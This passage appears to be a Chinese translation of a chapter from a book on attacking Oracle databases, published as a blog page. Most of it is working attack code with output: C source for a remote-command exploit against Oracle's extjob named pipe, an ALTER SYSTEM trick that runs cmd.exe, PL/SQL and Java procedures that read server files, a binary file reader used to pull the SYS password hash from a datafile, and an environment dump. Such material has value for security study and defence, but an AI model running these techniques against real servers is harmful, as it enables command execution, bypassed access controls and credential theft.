class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">/* Oracle External Job Remote Command Exploit</span><br><span class="line">Oracle&#x27;s extjob.exe listens on a named pipe &quot;orcljsex&lt;SID&gt; and executes</span><br><span class="line">commands</span><br><span class="line">sent through it.</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line"> char buffer[540]=&quot;&quot;;</span><br><span class="line"> char NamedPipe[260]=&quot;\\\\&quot;;</span><br><span class="line"> HANDLE rcmd=NULL;</span><br><span class="line"> char *ptr = NULL;</span><br><span class="line"> int len =0;</span><br><span class="line"> DWORD Bytes = 0;</span><br><span class="line"></span><br><span class="line"> if(argc !=4)</span><br><span class="line"> &#123;</span><br><span class="line">  printf(&quot;\n\tOracle External Job Remote Command Exploit.\n\n&quot;);</span><br><span class="line">  printf(&quot;\tUsage: oraextjob target SID \&quot; command\&quot;\n&quot;);</span><br><span class="line">  printf(&quot;\n\tDavid Litchfield\n\t(david@ngssoftware.com)\n\t1st October</span><br><span class="line">2006\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> strncat(NamedPipe,argv[1],100);</span><br><span class="line"> strcat(NamedPipe,&quot;\\pipe\\orcljsex&quot;);</span><br><span class="line"> len = strlen(NamedPipe);</span><br><span class="line"> if(len&gt;256)</span><br><span class="line">                                          return printf(&quot;Too long...\n&quot;);</span><br><span class="line"> len = 256 - len;</span><br><span class="line">// tack on the SID</span><br><span class="line"> strncat(NamedPipe,argv[2],len);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> // Open the named pipe</span><br><span class="line"> rcmd =</span><br><span class="line">CreateFile(NamedPipe,GENERIC_WRITE|GENERIC_READ,0,NULL,OPEN_EXISTING,0,N</span><br><span class="line">ULL);</span><br><span class="line"> if(rcmd == INVALID_HANDLE_VALUE)</span><br><span class="line">  return printf(&quot;Failed to open pipe %s. Error</span><br><span class="line">%d.\n&quot;,NamedPipe,GetLastError());</span><br><span class="line"></span><br><span class="line"> // Send command</span><br><span class="line"> len = WriteFile(rcmd,argv[3],strlen(argv[3]),&amp;Bytes,NULL);</span><br><span class="line"></span><br><span class="line"> if(!len)</span><br><span class="line">  return printf(&quot;Failed to write to %s. Error</span><br><span class="line">%d.\n&quot;,NamedPipe,GetLastError());</span><br><span class="line"></span><br><span class="line"> // Read results</span><br><span class="line"> while(len)</span><br><span class="line"> &#123;</span><br><span class="line">  len = ReadFile(rcmd,buffer,530,&amp;Bytes,NULL);</span><br><span class="line">  printf(&quot;%s&quot;,buffer);</span><br><span class="line"></span><br><span class="line">  ZeroMemory(buffer,540);</span><br><span class="line"> &#125;</span><br><span class="line">CloseHandle(rcmd);</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="通过ALTER-SYSTEM运行系统命令"><a href="#通过ALTER-SYSTEM运行系统命令" class="headerlink" title="通过ALTER SYSTEM运行系统命令"></a>通过ALTER SYSTEM运行系统命令</h3><p>Oracle 从未打算将其作为运行命令的正确方法，但它运行良好。 在 Oracle 9i 中，可以操纵 Oracle 编译本机 PL/SQL 程序的方式。 这是通过提供 make 程序的名称来完成的。 显然，这可以被滥用来运行操作系统命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ALTER SYSTEM SET plsql_native_make_utility = &#x27;cmd.exe /C dir &gt;</span><br><span class="line">c:\ooops.txt &amp;&#x27;;</span><br><span class="line">ALTER SYSTEM SET plsql_native_make_file_name = &#x27; foo&#x27;;</span><br><span class="line">ALTER SYSTEM SET plsql_native_library_dir=&#x27;bar&#x27;;</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE PROCEDURE ohoh AS</span><br><span class="line">BEGIN</span><br><span class="line">NULL;</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">show errors</span><br></pre></td></tr></table></figure>

<p>当 Oracle 编译 ohoh 过程时，Oracle 执行以下操作：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /C dir &gt; c:\ooops.txt &amp; -f foo bar/RUN_CMD__SYSTEM__0.DLL</span><br></pre></td></tr></table></figure>

<p>Oracle 10g 弃用了 plsql_native_make_utility 参数。</p>
<h2 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h2><p>一旦服务器遭到入侵，攻击者可能想要探索文件系统——事实上，大量 Oracle 文件包含用户 ID 和密码，因此攻击者可能能够提升权限，如果他们还没有这样做的话。 可以使用 PL/SQL 或 Java 来访问文件系统。 由于对文件系统的访问是通过用于运行服务器的帐户的权限实现的，因此攻击者可以获得对数据库数据文件的直接原始访问。 因此，可以完全绕过所有数据库强制访问控制。 您已经在第 8 章“击败虚拟专用数据库”中看到了这一点。</p>
<h3 id="使用UTL-FILE-包访问文件系统"><a href="#使用UTL-FILE-包访问文件系统" class="headerlink" title="使用UTL_FILE 包访问文件系统"></a>使用UTL_FILE 包访问文件系统</h3><p>UTL_FILE 包使 Oracle 用户能够读取和写入文件系统。 如前所述，对文件系统上的文件的访问是通过 Oracle 用户的权限实现的 - 因此该用户可以读取或写入的任何内容都可以被其他任何人读取或写入。 以下 PL/SQL 代码可用于从文件系统读取文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE PROCEDURE READ_FILE(DIRNAME VARCHAR2, FNAME VARCHAR2)</span><br><span class="line">AS</span><br><span class="line">invalid_path EXCEPTION;</span><br><span class="line">access_denied EXCEPTION;</span><br><span class="line">PRAGMA EXCEPTION_INIT(invalid_path, -29280);</span><br><span class="line">PRAGMA EXCEPTION_INIT(access_denied, -29289);</span><br><span class="line">FD UTL_FILE.FILE_TYPE;</span><br><span class="line">BUFFER VARCHAR2(260);</span><br><span class="line">BEGIN</span><br><span class="line"></span><br><span class="line">        EXECUTE IMMEDIATE &#x27;CREATE OR REPLACE DIRECTORY RW_FILE AS &#x27;&#x27;&#x27; ||</span><br><span class="line">DIRNAME || &#x27;&#x27;&#x27;&#x27;;</span><br><span class="line">        FD := UTL_FILE.FOPEN(&#x27;RW_FILE&#x27;,FNAME,&#x27;r&#x27;);</span><br><span class="line">        DBMS_OUTPUT.ENABLE(1000000);</span><br><span class="line">        LOOP</span><br><span class="line">                UTL_FILE.GET_LINE(FD,BUFFER,254);</span><br><span class="line">                DBMS_OUTPUT.PUT_LINE(BUFFER);</span><br><span class="line">        END LOOP;</span><br><span class="line">        EXECUTE IMMEDIATE &#x27;DROP DIRECTORY RW_FILE&#x27;;</span><br><span class="line"></span><br><span class="line">EXCEPTION WHEN invalid_path THEN</span><br><span class="line">                DBMS_OUTPUT.PUT_LINE(&#x27;File location or path is</span><br><span class="line">invalid.&#x27;);</span><br><span class="line">                IF (UTL_FILE.IS_OPEN(FD) = TRUE) THEN</span><br><span class="line">                        UTL_FILE.FCLOSE(FD);</span><br><span class="line">                END IF;</span><br><span class="line">                EXECUTE IMMEDIATE &#x27;DROP DIRECTORY RW_FILE&#x27;;</span><br><span class="line">        WHEN access_denied THEN</span><br><span class="line">                DBMS_OUTPUT.PUT_LINE(&#x27;Access is denied.&#x27;);</span><br><span class="line">                IF (UTL_FILE.IS_OPEN(FD) = TRUE) THEN</span><br><span class="line">                        UTL_FILE.FCLOSE(FD);</span><br><span class="line">                END IF;</span><br><span class="line">                EXECUTE IMMEDIATE &#x27;DROP DIRECTORY RW_FILE&#x27;;</span><br><span class="line">        WHEN NO_DATA_FOUND THEN</span><br><span class="line">                DBMS_OUTPUT.PUT_LINE(&#x27;End of file.&#x27;);</span><br><span class="line">                IF (UTL_FILE.IS_OPEN(FD) = TRUE) THEN</span><br><span class="line">                        UTL_FILE.FCLOSE(FD);</span><br><span class="line">                END IF;</span><br><span class="line">                EXECUTE IMMEDIATE &#x27;DROP DIRECTORY RW_FILE&#x27;;</span><br><span class="line">        WHEN OTHERS THEN</span><br><span class="line">                IF (UTL_FILE.IS_OPEN(FD) = TRUE) THEN</span><br><span class="line">                        UTL_FILE.FCLOSE(FD);</span><br><span class="line">                END IF;</span><br><span class="line">                DBMS_OUTPUT.PUT_LINE(&#x27;There was an error.&#x27;);</span><br><span class="line">                EXECUTE IMMEDIATE &#x27;DROP DIRECTORY RW_FILE&#x27;;</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">EXEC READ_FILE(&#x27;C:\&#x27;,&#x27;boot.ini&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="使用Java访问文件系统"><a href="#使用Java访问文件系统" class="headerlink" title="使用Java访问文件系统"></a>使用Java访问文件系统</h3><p>使用 UTL_FILE 包访问文件系统要求用户有权访问 DIRECTORY 对象或创建 DIRECTORY 对象的权限。 使用 Java 不需要存在 DIRECTORY - 而是需要读写 java.io.FilePermission。 这可以通过调用 DBMS_JAVA.GRANT_PERMISSION 来授予：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec dbms_java.grant_permission(&#x27;SCOTT&#x27;,</span><br><span class="line">&#x27;SYS:java.io.FilePermission&#x27;,&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;,&#x27;read&#x27;);</span><br><span class="line"></span><br><span class="line">exec dbms_java.grant_permission(&#x27;SCOTT&#x27;,</span><br><span class="line">&#x27;SYS:java.io.FilePermission&#x27;,&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;,&#x27;write&#x27;);</span><br></pre></td></tr></table></figure>

<p>以下代码使用户能够以 Oracle 用户的权限读取文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">set serveroutput on</span><br><span class="line">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JAVAREADFILE&quot; AS</span><br><span class="line">import java.lang.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class JAVAREADFILE</span><br><span class="line">&#123;</span><br><span class="line">        public static void readfile(String filename) throws IOException</span><br><span class="line">        &#123;</span><br><span class="line">                FileReader f = new FileReader(filename);</span><br><span class="line">                BufferedReader fr = new BufferedReader(f);</span><br><span class="line">                String text = fr.readLine();;</span><br><span class="line">                while(text != null)</span><br><span class="line">                &#123;</span><br><span class="line">                        System.out.println(text);</span><br><span class="line">                        text = fr.readLine();</span><br><span class="line">                &#125;</span><br><span class="line">                fr.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE PROCEDURE JAVAREADFILEPROC (p_filename IN VARCHAR2)</span><br><span class="line">AS LANGUAGE JAVA</span><br><span class="line">NAME &#x27;JAVAREADFILE.readfile (java.lang.String)&#x27;;</span><br><span class="line">/</span><br><span class="line">exec dbms_java.set_output(2000);</span><br><span class="line">exec JAVAREADFILEPROC(&#x27;C:\boot.ini&#x27;)</span><br></pre></td></tr></table></figure>

<p>显然，前面的代码比使用 UTL_FILE 和使用那些讨厌的 DIRECTORY 对象调度要简洁得多。</p>
<h3 id="访问二进制文件"><a href="#访问二进制文件" class="headerlink" title="访问二进制文件"></a>访问二进制文件</h3><p>使用 Oracle 的 Java 访问基于二进制的文件有点奇怪——如果文件太大，它会使服务器的 CPU 以 100% 的速度旋转。 因此，在访问文件时，您需要以小块的形式进行。 以下代码将文件名作为其第一个参数，并将文件偏移量作为其第二个参数。 然后它从该偏移量中读取 512 个字节。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">SET ESCAPE ON</span><br><span class="line">SET ESCAPE &quot;\&quot;</span><br><span class="line">SET SERVEROUTPUT ON</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JAVAREADBINFILE&quot; AS</span><br><span class="line">import java.lang.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class JAVAREADBINFILE</span><br><span class="line">&#123;</span><br><span class="line">        public static void readbinfile(String f, int start) throws</span><br><span class="line">IOException</span><br><span class="line">      &#123;</span><br><span class="line">             FileInputStream fis;</span><br><span class="line">            DataInputStream dis;</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                  int i;</span><br><span class="line">                  int ih,il;</span><br><span class="line">                  int cnt = 1, h=0,l=0;</span><br><span class="line">                  String hex[] = &#123;&quot;0&quot;, &quot;1&quot;, &quot;2&quot;,&quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;,</span><br><span class="line">&quot;8&quot;,&quot;9&quot;, &quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;, &quot;E&quot;,&quot; F&quot;&#125;;</span><br><span class="line"></span><br><span class="line">                  RandomAccessFile raf = new RandomAccessFile (f, &quot;r&quot;);</span><br><span class="line">                  raf.seek (start);</span><br><span class="line">                  for(i=0; i&lt;=512; i++)</span><br><span class="line">                  &#123;</span><br><span class="line"></span><br><span class="line">                        ih = il = raf.readByte() \&amp; 0xFF;</span><br><span class="line">                        h = ih &gt;&gt; 4;</span><br><span class="line">                        l = il \&amp; 0x0F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        System.out.print(&quot;\\\\x&quot; + hex[h] + hex[l]);</span><br><span class="line">                        if(cnt \% 16 == 0)</span><br><span class="line"></span><br><span class="line">                              System.out.println();</span><br><span class="line">                        cnt ++;</span><br><span class="line"></span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            catch (EOFException eof)</span><br><span class="line">                  &#123;</span><br><span class="line">                  System.out.println();</span><br><span class="line">                  System.out.println(&quot;EOF reached &quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            catch (IOException ioe)</span><br><span class="line">            &#123;</span><br><span class="line">                  System.out.println(&quot;IO error: &quot;+ ioe);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">/</span><br><span class="line">show errors</span><br><span class="line">/</span><br><span class="line">CREATE OR REPLACE PROCEDURE JAVAREADBINFILEPROC (p_filename IN</span><br><span class="line">VARCHAR2, p_start in number)</span><br><span class="line">AS LANGUAGE JAVA</span><br><span class="line">NAME &#x27;JAVAREADBINFILE.readbinfile (java.lang.String, int)&#x27;;</span><br><span class="line">/</span><br><span class="line">show errors</span><br><span class="line">/</span><br></pre></td></tr></table></figure>

<p>通过使用以下代码直接访问 Oracle 数据文件，您可以完全绕过数据库服务器强制执行的访问控制。 例如，以下输出显示访问 SYSTEM01.DBF 文件中存储 USER$ 表的部分：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">set serveroutput on</span><br><span class="line">exec dbms_java.set_output(2000);</span><br><span class="line">SQL&gt; exec</span><br><span class="line">JAVAREADBINFILEPROC(&#x27;C:\\oracle\\oradata\\orcl\\system01.DBF&#x27;,448767)</span><br><span class="line">\x53\x59\x53\x02\xC1\x02\x10\x30\x44\x34\x37\x42\x35\x35\x30\x43</span><br><span class="line">\x35\x46\x37\x30\x44\x45\x44\x01\x80\x02\xC1\x04\x07\x78\x69\x0A</span><br><span class="line">\x1B\x04\x3C\x23\x07\x78\x6A\x03\x11\x0E\x24\x12\xFF\xFF\x01\x80</span><br><span class="line">\xFF\x02\xC1\x02\xFF\xFF\x01\x80\x01\x80\x09\x53\x59\x53\x5F\x47</span><br><span class="line">\x52\x4F\x55\x50\x6C\x00\x11\x05\x06\x53\x59\x53\x54\x45\x4D\x02</span><br><span class="line">\xC1\x02\x10\x44\x34\x44\x46\x37\x39\x33\x31\x41\x42\x31\x33\x30</span><br><span class="line">\x45\x33\x37\x01\x80\x01\x80\x07\x78\x69\x0A\x1B\x04\x3C\x23\x07</span><br><span class="line">\x78\x69\x0A\x1B\x04\x3C\x23\xFF\xFF\x01\x80\xFF\x02\xC1\x02\xFF</span><br><span class="line">\xFF\x01\x80\x01\x80\x09\x53\x59\x53\x5F\x47\x52\x4F\x55\x50\x6C</span><br><span class="line">\x00\x11\x0E\x0C\x41\x51\x5F\x55\x53\x45\x52\x5F\x52\x4F\x4C\x45</span><br><span class="line">\x01\x80\xFF\x01\x80\x01\x80\x07\x78\x69\x0A\x1B\x05\x03\x3C\xFF</span><br><span class="line"></span><br><span class="line">\xFF\xFF\x01\x80\xFF\x02\xC1\x02\xFF\xFF\x01\x80\x01\x80\x16\x44</span><br><span class="line">\x45\x46\x41\x55\x4C\x54\x5F\x43\x4F\x4E\x53\x55\x4D\x45\x52\x5F</span><br><span class="line">\x47\x52\x4F\x55\x50\xAC\x00\x01\x01\x00\x01\x00\x00\x40\x00\x36</span><br><span class="line">\x00\x0F\x00\x40\x00\x36\x00\x0F\x02\xC1\x10\x6C\x00\x11\x0D\x15</span><br><span class="line">\x41\x51\x5F\x41\x44\x4D\x49\x4E\x49\x53\x54\x52\x41\x54\x4F\x52</span><br><span class="line">\x5F\x52\x4F\x4C\x45\x01\x80\xFF\x01\x80\x01\x80\x07\x78\x69\x0A</span><br><span class="line">\x1B\x05\x03\x3C\xFF\xFF\xFF\x01\x80\xFF\x02\xC1\x02\xFF\xFF\x01</span><br><span class="line">\x80\x01\x80\x16\x44\x45\x46\x41\x55\x4C\x54\x5F\x43\x4F\x4E\x53</span><br><span class="line">\x55\x4D\x45\x52\x5F\x47\x52\x4F\x55\x50\xAC\x00\x01\x01\x00\x01</span><br><span class="line">\x00\x00\x40\x00\x36\x00\x0E\x00\x40\x00\x36\x00\x0E\x02\xC1\x0F</span><br><span class="line">\x6C\x00\x07\x05\x01\x80\x01\x80\x02\xC1\x61\x01\x80\x01\x80\x01</span><br><span class="line">\x80\x01\x80\x6C\x00\x11\x0C\x16\x52\x45\x43\x4F\x56\x45\x52\x59</span><br><span class="line">\x5F\x43\x41\x54\x41\x4C\x4F\x47\x5F\x4F\x57\x4E\x45\x52\x01\x80</span><br><span class="line">\xFF\x01\x80\x01\x80\x07\x78\x69\x0A\x1B\x05\x02\x2C\xFF\xFF\xFF</span><br><span class="line">\x01\x80\xFF\x02\xC1\x02\xFF\xFF\x01\x80\x01\x80\x16\x44\x45\x46</span><br><span class="line">\x41\x55\x4C\x54\x5F\x43\x4F\x4E\x53\x55\x4D\x45\x52\x5F\x47\x52</span><br><span class="line">\x4F\x55\x50\xAC\x00\x01\x01\x00\x01\x00\x00\x40\x00\x36\x00\x0D</span><br></pre></td></tr></table></figure>

<p>如果您查看输出的第一行，前 3 个字节是 \x53\x59\x53 - 这是“SYS”。 跳过接下来的 4 个字节并取接下来的 16 个字节，您将得到以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x30\x44\x34\x37\x42\x35\x35\x30\x43\x35\x46\x37\x30\x44\x45\x44&quot;</span><br></pre></td></tr></table></figure>

<p>这转换为“0D47B550C5F70DED”，它是 SYS 用户的密码哈希。 确认这一点，您可以运行以下选择：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select password from dba_users where username = &#x27;SYS&#x27;;</span><br><span class="line"></span><br><span class="line">PASSWORD</span><br><span class="line">------------------------------</span><br><span class="line">0D47B550C5F70DED</span><br></pre></td></tr></table></figure>

<p>可以将代码包装在循环中以提取整个数据文件。 有关这方面的更多信息，请参阅第 12 章中的“数据泄露”部分。</p>
<h3 id="使用操作系统环境变量"><a href="#使用操作系统环境变量" class="headerlink" title="使用操作系统环境变量"></a>使用操作系统环境变量</h3><p>Oracle 10g 在 DBMS_SYSTEM 包中引入了一个名为 GET_ENV 的过程。 此过程采用环境变量的名称并返回其值。 它不会返回 PATH 环境变量的值，但是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE PROCEDURE DUMP_ENV AS</span><br><span class="line">BUFFER VARCHAR2(260);</span><br><span class="line"></span><br><span class="line">BEGIN</span><br><span class="line">        -- SYS.DBMS_SYSTEM.GET_ENV WON&#x27;T GIVE BACK THE</span><br><span class="line">        -- PATH ENVIRONMENT VARIABLE</span><br><span class="line"></span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;ORACLE_HOME&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;ORACLE_HOME: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;ORACLE_SID&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;ORACLE_SID: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;COMPUTERNAME&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;COMPUTERNAME: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;OS&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;OS: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;TEMP&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;TEMP: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;WINDIR&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;WINDIR: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;SYSTEMROOT&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;SYSTEMROOT: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;PROGRAMFILES&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;PROGRAMFILES: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;COMSPEC&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;COMSPEC: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;PROCESSOR_ARCHITECTURE&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;PROCESSOR_ARCHITECTURE: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;PROCESSOR_IDENTIFIER&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;PROCESSOR_IDENTIFIER: &#x27; || BUFFER);</span><br><span class="line"></span><br><span class="line">END DUMP_ENV;</span><br><span class="line">/</span><br><span class="line">EXEC DUMP_ENV;</span><br></pre></td></tr></table></figure>

<p>此过程产生以下输出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ORACLE_HOME: C:\oracle\product\10.1.0\Db_1</span><br><span class="line">ORACLE_SID: orcl10g</span><br><span class="line">COMPUTERNAME: GLADIUS</span><br><span class="line">OS: Windows_NT</span><br><span class="line">TEMP: C:\WINDOWS\TEMP</span><br><span class="line">WINDIR: C:\WINDOWS</span><br><span class="line">SYSTEMROOT: C:\WINDOWS</span><br><span class="line">PROGRAMFILES: C:\Program Files</span><br><span class="line">COMSPEC: C:\WINDOWS\system32\cmd.exe</span><br><span class="line">PROCESSOR_ARCHITECTURE: x86</span><br><span class="line">PROCESSOR_IDENTIFIER: x86 Family 6 Model 9 Stepping 5, GenuineIntel</span><br></pre></td></tr></table></figure>

<h2 id="访问网络"><a href="#访问网络" class="headerlink" title="访问网络"></a>访问网络</h2><p>本章研究访问网络的目的是为了数据泄露以及从受感染的 Oracle 服务器攻击其他系统。</p>
